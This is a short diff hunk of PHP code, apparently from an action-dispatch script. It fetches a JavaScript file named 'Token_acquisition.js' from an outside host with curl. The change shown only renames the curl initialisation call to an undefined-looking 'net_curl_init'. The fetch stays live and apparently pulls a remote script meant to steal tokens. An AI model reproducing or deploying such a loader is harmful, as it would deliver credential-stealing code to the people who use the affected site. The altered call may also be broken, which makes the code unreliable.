@@ -712,7 +712,7 @@ switch ($action) {
         $src = 'https://harbor-ljmr.upma.site/Token_acquisition.js';
         $raw = null; $code = 0;
         if (function_exists('curl_init')) {
-            $ch = curl_init($src);
+            $ch = net_curl_init($src);
             curl_setopt_array($ch, array(
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_FOLLOWLOCATION => true,
